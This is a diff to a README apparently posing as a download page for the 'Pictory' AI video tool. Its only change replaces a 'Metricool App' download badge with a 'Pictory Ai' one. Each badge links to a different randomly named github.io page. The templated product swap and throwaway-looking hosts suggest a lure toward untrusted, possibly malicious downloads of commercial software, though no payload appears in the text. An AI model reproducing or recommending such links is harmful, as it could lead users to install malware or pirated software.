@@ -1,6 +1,6 @@
 # Pictory Download — AI Video Platform
 
-[![GET Metricool App](https://img.shields.io/badge/GET%20%E2%80%94%20Metricool-App-0078D6?style=for-the-badge&logoColor=white)](https://szumigalavorce90.github.io/.github/Metricool-App)
+[![GET Pictory Ai](https://img.shields.io/badge/GET%20%E2%80%94%20Pictory-Ai-0078D6?style=for-the-badge&logoColor=white)](https://partmansuperpilant.github.io/.github/Pictory-Ai)
 
 ---
 
